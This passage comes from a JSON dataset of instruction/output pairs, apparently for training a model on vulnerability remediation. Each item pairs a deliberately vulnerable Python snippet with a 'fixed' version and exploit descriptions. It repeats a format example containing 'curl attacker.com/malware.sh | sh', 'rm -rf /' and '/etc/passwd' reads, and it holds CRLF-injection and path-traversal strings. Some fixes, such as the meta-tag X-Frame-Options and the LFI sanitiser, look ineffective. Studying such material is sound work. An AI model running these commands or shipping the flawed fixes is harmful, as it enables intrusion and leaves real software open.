 \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nfrom flask import Flask, render_template_string\\napp = Flask(__name__)\\n@app.route('/')\\ndef index():\\n    return render_template_string('<iframe src=\\\"https://malicious.com\\\" style=\\\"opacity:0;position:absolute;z-index:1000;width:100%;height:100%\\\"></iframe><h1>Welcome to our site!</h1>')",
      "vulnerability_type": "Clickjacking (Low Severity)",
      "cvss_score": 3.7,
      "fixed_code": "# Python example\\nfrom flask import Flask, render_template_string\\napp = Flask(__name__)\\n@app.route('/')\\ndef index():\\n    return render_template_string('<h1>Welcome to our site!</h1><meta http-equiv=\\\"X-Frame-Options\\\" content=\\\"DENY\\\">')",
      "exploit_ways": [
        "An attacker could embed the vulnerable page in a frame and trick users into clicking on hidden elements.",
        "Malicious actors can exploit this by overlaying interactive buttons or links without user knowledge.",
        "Users might inadvertently perform actions like liking, sharing, or downloading content from a malicious site."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: HTTP Response Splitting\n- Vulnerable Code: # Python example\ndef send_response(user_input):\n    response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \" + user_input\n    return response\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef send_response(user_input):\\n    response = \\\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \\\" + user_input\\n    return response",
      "vulnerability_type": "HTTP Response Splitting",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\ndef send_response(user_input):\\n    import urllib.parse\\n    safe_user_input = urllib.parse.quote(user_input)\\n    response = \\\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \\\" + safe_user_input\\n    return response",
      "exploit_ways": [
        "An attacker can input 'Username\\r\\nSet-Cookie: SessionID=malicious' to inject cookies.",
        "They could use '\\r\\nLocation: http://attacker.com' for a redirection attack.",
        "Input like '\\r\\nContent-Length: 0' to manipulate the response length."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation\n- Vulnerable Code: class SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if user_id not in self.sessions:\n            self.sessions[user_id] = session_id\n        return self.sessions[user_id]\n\n    def get_user(self, session_id):\n        for user_id, sid in self.sessions.items():\n            if sid == session_id:\n                return user_id\n        return None\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "class SessionManager:\\n    def __init__(self):\\n        self.sessions = {}\\n\\n    def create_session(self, user_id, session_id):\\n        if user_id not in self.sessions:\\n            self.sessions[user_id] = session_id\\n        return self.sessions[user_id]\\n\\n    def get_user(self, session_id):\\n        for user_id, sid in self.sessions.items():\\n            if sid == session_id:\\n                return user_id\\n        return None",
      "vulnerability_type": "Session Fixation",
      "cvss_score": 4.0,
      "fixed_code": "import uuid\\nclass SessionManager:\\n    def __init__(self):\\n        self.sessions = {}\\n\\n    def create_session(self, user_id):\\n        session_id = str(uuid.uuid4())\\n        self.sessions[session_id] = user_id\\n        return session_id\\n\\n    def get_user(self, session_id):\\n        return self.sessions.get(session_id)",
      "exploit_ways": [
        "An attacker could set a fixed session ID before the user logs in, capturing their session once authenticated.",
        "By manipulating session IDs, an attacker might take over a legitimate user's session if they guess or predict the session identifier.",
        "Attacker can force a target user to use a specific session ID via various means like phishing links containing a predetermined session token."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: # Python example\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if session_id not in self.sessions:\n            self.sessions[session_id] = {\"user_id\": user_id}\n        return self.sessions[session_id]\n\n    def get_user_by_session(self, session_id):\n        return self.sessions.get(session_id, {}).get(\"user_id\")\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nclass SessionManager:\\n    def __init__(self):\\n        self.sessions = {}\\n\\n    def create_session(self, user_id, session_id):\\n        if session_id not in self.sessions:\\n            self.sessions[session_id] = {\\\"user_id\\\": user_id}\\n        return self.sessions[session_id]\\n\\n    def get_user_by_session(self, session_id):\\n        return self.sessions.get(session_id, {}).get(\\\"user_id\\\")",
      "vulnerability_type": "Session Fixation (Low Severity)",
      "cvss_score": 4.2,
      "fixed_code": "# Python example\\nclass SessionManager:\\n    import uuid\\n\\n    def __init__(self):\\n        self.sessions = {}\\n\\n    def create_session(self, user_id):\\n        session_id = str(uuid.uuid4())\\n        self.sessions[session_id] = {\\\"user_id\\\": user_id}\\n        return session_id\\n\\n    def get_user_by_session(self, session_id):\\n        return self.sessions.get(session_id, {}).get(\\\"user_id\\\")",
      "exploit_ways": [
        "An attacker can provide a predetermined session ID to the server, hijacking an existing session if it exists.",
        "If the session ID is predictable or reused, attackers could guess and use valid session IDs to gain unauthorized access.",
        "By controlling the session ID assignment process on the client side, attackers might influence the server to associate their requests with legitimate sessions."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Clickjacking (Low Severity)\n- Vulnerable Code: from flask import Flask, render_template_string\ndef get_hidden_iframe():\n    return '<iframe src=\"https://malicious-site.com\" style=\"position:absolute; top:-100px; left:-100px;\"></iframe>'\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    template = get_hidden_iframe() + \"<h1>Welcome to the site!</h1>\"\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run(debug=True)\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "from flask import Flask, render_template_string\\ndef get_hidden_iframe():\\n    return '<iframe src=\\\"https://malicious-site.com\\\" style=\\\"position:absolute; top:-100px; left:-100px;\\\"></iframe>'\\napp = Flask(__name__)\\n@app.route('/')\\ndef index():\\n    template = get_hidden_iframe() + \\\"<h1>Welcome to the site!</h1>\\\"\\n    return render_template_string(template)\\nif __name__ == '__main__':\\n    app.run(debug=True)",
      "vulnerability_type": "Clickjacking (Low Severity)",
      "cvss_score": 3.5,
      "fixed_code": "from flask import Flask, render_template_string\\napp = Flask(__name__)\\n@app.after_request\\ndef add_header(response):\\n    response.headers['X-Frame-Options'] = 'DENY'\\n    return response\\n@app.route('/')\\ndef index():\\n    template = \\\"<h1>Welcome to the site!</h1>\\\"\\n    return render_template_string(template)\\nif __name__ == '__main__':\\n    app.run(debug=True)",
      "exploit_ways": [
        "An attacker could overlay a hidden iframe over a legitimate button to trick users into clicking on it without their knowledge.",
        "Users can be manipulated into performing actions on the malicious site while thinking they are interacting with the trusted site.",
        "The malicious site could use the user's interaction to perform unauthorized actions on behalf of the user."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Open Redirect\n- Vulnerable Code: class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = url\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = url\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)",
      "vulnerability_type": "Open Redirect",
      "cvss_score": 6.5,
      "fixed_code": "class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = self.sanitize_url(url)\\n    def sanitize_url(self, url):\\n        import urllib.parse\\n        parsed_url = urllib.parse.urlparse(url)\\n        if parsed_url.scheme in ('http', 'https') and parsed_url.netloc:\\n            return url\\n        raise ValueError('Invalid URL')\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)",
      "exploit_ways": [
        "An attacker can provide a malicious URL like 'http://attacker.com' to redirect users away from the intended site.",
        "They could use a crafted URL with additional parameters or paths to access unintended pages, such as 'https://legitimate.com/redirect?to=http://malicious.com'.",
        "By using a data URL scheme like 'data:text/html;base64,...', an attacker can inject HTML content directly into the browser."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import os\nclass FileReader:\n    def __init__(self, path):\n        self.path = path\n    def read_file(self):\n        file_path = os.path.join(os.getcwd(), self.path)\n        with open(file_path, 'r') as file:\n            return file.read()\n- CVSS Score: 5.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\nclass FileReader:\\n    def __init__(self, path):\\n        self.path = path\\n    def read_file(self):\\n        file_path = os.path.join(os.getcwd(), self.path)\\n        with open(file_path, 'r') as file:\\n            return file.read()",
      "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
      "cvss_score": 5.0,
      "fixed_code": "import os\\nclass FileReader:\\n    def __init__(self, path):\\n        self.path = self.sanitize_path(path)\\n    def sanitize_path(self, path):\\n        allowed_dir = os.getcwd()\\n        full_path = os.path.abspath(os.path.join(allowed_dir, path))\\n        if not full_path.startswith(allowed_dir):\\n            raise ValueError(\\\"Path is outside of the allowed directory\\\")\\n        return path\\n    def read_file(self):\\n        file_path = os.path.join(os.getcwd(), self.path)\\n        with open(file_path, 'r') as file:\\n            return file.read()",
      "exploit_ways": [
        "An attacker can input '../../../../etc/passwd' to read the system's password file.",
        "They could try accessing 'config.ini' to retrieve sensitive configuration details.",
        "Input like '../../../var/log/nginx/access.log' might leak web server access logs."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Open Redirect\n- Vulnerable Code: from flask import Flask, request, redirect\napp = Flask(__name__)\ndef validate_url(url):\n    allowed_domains = [\"example.com\", \"test.com\"]\n    for domain in allowed_domains:\n        if url.startswith(f'http://{domain}') or url.startswith(f'https://{domain}\"):\n            return True\n    return False\n@app.route('/redirect')\ndef redirect_to_url():\n    next_url = request.args.get('next', '')\n    if validate_url(next_url):\n        return redirect(next_url)\n    else:\n        return 'Invalid URL'\nif __name__ == '__main__':\n    app.run(debug=True)\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "from flask import Flask, request, redirect\\napp = Flask(__name__)\\ndef validate_url(url):\\n    allowed_domains = [\\\"example.com\\\", \\\"test.com\\\"]\\n    for domain in allowed_domains:\\n        if url.startswith(f'http://{domain}') or url.startswith(f'https://{domain}\\\"):\\n            return True\\n    return False\\n@app.route('/redirect')\\ndef redirect_to_url():\\n    next_url = request.args.get('next', '')\\n    if validate_url(next_url):\\n        return redirect(next_url)\\n    else:\\n        return 'Invalid URL'\\nif __name__ == '__main__':\\n    app.run(debug=True)",
      "vulnerability_type": "Open Redirect",
      "cvss_score": 6.5,
      "fixed_code": "from flask import Flask, request, redirect\\napp = Flask(__name__)\\ndef validate_url(url):\\n    from urllib.parse import urlparse\\n    allowed_domains = {\\\"example.com\\\", \\\"test.com\\\"}\\n    parsed_url = urlparse(url)\\n    if parsed_url.netloc in allowed_domains:\\n        return True\\n    return False\\n@app.route('/redirect')\\ndef redirect_to_url():\\n    next_url = request.args.get('next', '')\\n    if validate_url(next_url):\\n        return redirect(next_url)\\n    else:\\n        return 'Invalid URL'\\nif __name__ == '__main__':\\n    app.run(debug=True)",
      "exploit_ways": [
        "An attacker can redirect users to a malicious site by providing a valid-looking URL like http://example.com/evil",
        "They could exploit it with crafted URLs including port numbers and paths to trick users into thinking they are staying on the same domain.",
        "Using URL encoding in the query parameters, attackers can obfuscate malicious URLs, making them harder to detect."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Denial-of-Service (DoS) - Low Impact\n- Vulnerable Code: # Python example\nimport time\ndef slow_function():\n    while True:\n        for i in range(100000):\n            pass\n        time.sleep(0.1)\ndef trigger_dos():\n    if input('Enter secret key: ') == 'secret':\n        slow_function()\n- CVSS Score: 4.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nimport time\\ndef slow_function():\\n    while True:\\n        for i in range(100000):\\n            pass\\n        time.sleep(0.1)\\ndef trigger_dos():\\n    if input('Enter secret key: ') == 'secret':\\n        slow_function()",
      "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
      "cvss_score": 4.5,
      "fixed_code": "# Python example\\nimport time\\ndef slow_function():\\n    for i in range(10):\\n        pass\\ndef trigger_dos():\\n    if input('Enter secret key: ') == 'secret':\\n        slow_function()",
      "exploit_ways": [
        "An attacker can continuously call the function to keep the server busy.",
        "Inputting the correct secret key will activate the infinite loop, causing a denial of service locally.",
        "The vulnerability can be used in scripts to exhaust system resources over time."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: class UserInfo:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def get_info(self):\n        return f\"Username: {self.username}, Password: {self.password}\"\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "class UserInfo:\\n    def __init__(self, username, password):\\n        self.username = username\\n        self.password = password\\n\\n    def get_info(self):\\n        return f\\\"Username: {self.username}, Password: {self.password}\\\"",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 4.0,
      "fixed_code": "class UserInfo:\\n    def __init__(self, username, password):\\n        self.username = username\\n        self.password = password\\n\\n    def get_info(self):\\n        return f\\\"Username: {self.username}, Password: ********\\\"",
      "exploit_ways": [
        "An attacker can access the object's attributes and retrieve sensitive information like passwords.",
        "Through debugging or logging, an attacker might see the output of get_info() revealing passwords.",
        "If this class is used in a web application, user data could be exposed in error messages or logs."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: HTTP Response Splitting\n- Vulnerable Code: class HttpResponseSplitter:\n    def set_header(self, header_value):\n        self.header = f\"Content-Type: text/html\\r\\n{header_value}\\r\\n\"\n- CVSS Score: 6.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "class HttpResponseSplitter:\\n    def set_header(self, header_value):\\n        self.header = f\\\"Content-Type: text/html\\r\\n{header_value}\\r\\n\\\"",
      "vulnerability_type": "HTTP Response Splitting",
      "cvss_score": 6.1,
      "fixed_code": "import re\\nclass HttpResponseSplitter:\\n    def set_header(self, header_value):\\n        if re.search(r'\\r|\\n', header_value):\\n            raise ValueError('Invalid header value')\\n        self.header = f\\\"Content-Type: text/html\\r\\n{header_value}\\r\\n\\\"",
      "exploit_ways": [
        "An attacker can inject '\\r\\nSet-Cookie: exploit=true' to manipulate cookies.",
        "They could use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Exploit</h1>' to inject a new response.",
        "By injecting '\\r\\nLocation: http://malicious.com', the attacker could perform open redirection."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Missing Security Headers\n- Vulnerable Code: # Python example\ndef serve_content():\n    response = \"<html><body>Hello, world!</body></html>\"\n    return response\n- CVSS Score: 3.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat 